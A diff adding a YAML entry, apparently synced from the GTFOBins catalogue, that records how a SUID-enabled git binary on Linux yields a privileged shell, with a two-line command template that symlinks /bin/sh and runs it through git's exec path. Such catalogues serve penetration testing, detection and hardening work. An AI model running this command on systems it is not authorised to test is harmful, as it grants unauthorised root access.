@@ -1,0 +1,26 @@
+id: gtfobins/git/shell/suid
+type: binary
+platform: linux
+name: git
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'ln -s /bin/sh git-x
+
+    git --exec-path=. x -p'
+references:
+- https://gtfobins.github.io/gtfobins/git/
+tags:
+- linux
+- unix
+- gtfobins
